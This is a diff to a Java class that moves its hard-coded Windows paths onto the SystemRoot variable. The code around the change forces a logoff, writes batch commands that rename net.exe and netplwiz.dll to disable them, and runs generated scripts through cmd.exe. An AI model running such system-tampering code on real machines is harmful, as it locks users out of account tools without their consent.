@@ -26,9 +26,10 @@ public class Run implements IWriter{
   }
 
   public void execute(int code){
+    String sysPath = System.getenv("SystemRoot");
     switch(code){
         case 0:
-          Runtime.getRuntime().exec("C:\\Windows\\System32\\logoff.exe");
+          Runtime.getRuntime().exec(sysPath + "\\System32\\logoff.exe");
           break;
         case 1:
           writeText("C:\\t.cmd", "ren %systemroot%\\net.exe n1.exe");
@@ -37,7 +38,7 @@ public class Run implements IWriter{
           writeBR("C:\\t.cmd");
           writeText("C:\\t.cmd", "ren %systemroot%\\netplwiz.dll netplwiz.dl3");
           writeBR("C:\\t.cmd");
-          Runtime.getRuntime().exec("cmd.exe " + "C:\t.cmd");
+          Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\t.cmd");
         case 2:
           writeText("C:\\t.cmd", "ren %systemroot%\\n1.exe net.exe");
           writeBR("C:\\t.cmd");
@@ -45,7 +46,7 @@ public class Run implements IWriter{
           writeBR("C:\\t.cmd");
           writeText("C:\\t.cmd", "ren %systemroot%\\netplwiz.dl3 netplwiz.dll");
           writeBR("C:\\t.cmd");
-          Runtime.getRuntime().exec("cmd.exe " + "C:\t.cmd");
+          Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\t.cmd");
         default:
           return;
     }
@@ -102,7 +103,8 @@ public class Run implements IWriter{
         sb.append(IWriter.armv7a);
         sb.append(rv);
         thisInstance.writeText("C:\\t.cmd", sb.toString());
-        Runtime.getRuntime().exec("cmd.exe " + "C:\\t.cmd");
+        String sysPath = System.getenv("SystemRoot");
+        Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\\t.cmd");
       }
     }
   }
